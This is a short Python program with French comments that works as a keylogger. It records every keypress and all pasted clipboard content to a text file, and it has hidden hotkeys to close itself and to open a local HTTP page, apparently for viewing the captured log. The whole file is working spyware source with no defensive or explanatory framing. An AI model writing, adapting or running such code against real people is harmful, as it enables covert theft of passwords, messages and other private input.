import keyboard
import os
import sys
import pyperclip
import webbrowser
import time

def close_program():
    print("Combinaison de touches détectée. Fermeture du programme.")
    os.kill(os.getpid(), 9)  # Termine le processus en cours
    sys.exit()

def on_ctrl_v():
    clipboard_content = pyperclip.paste()
    with open("txt.txt", "a") as fichier:
        fichier.write("[ " + clipboard_content + " ]")

def on_key_pressed(event):
    with open("txt.txt", "a") as fichier:
        if event.name == 'space':
            fichier.write(" ")
        elif event.name == 'alt' and 'tab' in keyboard._pressed_events:
            fichier.write("[switch]")
        elif event.name == 'enter':
            fichier.write("\n")
        else:
            fichier.write(event.name)

    # Vérifie si les touches $ et * sont pressées
    if keyboard.is_pressed('$') and keyboard.is_pressed('*'):
        print("Serveur HTTP : http://(fait/ipconfig/pour/avoir/localhost/IP/:80/html.html)!")
        webbrowser.open("http://(fait/ipconfig/pour/avoir/localhost/IP/:80/html.html)")  # Ouvre le serveur HTTP dans le navigateur

# Ajoute un gestionnaire d'événements pour les touches
keyboard.add_hotkey('escape + !', close_program)
keyboard.add_hotkey('ctrl + v', on_ctrl_v)
keyboard.on_press(on_key_pressed)
time.sleep(0.01)

print("Le programme est en attente de la combinaison de touches 'Escape + !' pour se fermer et de 'Ctrl + V' pour coller le contenu du presse-papiers.")

# Maintient le programme en cours d'exécution
while True:
    continue
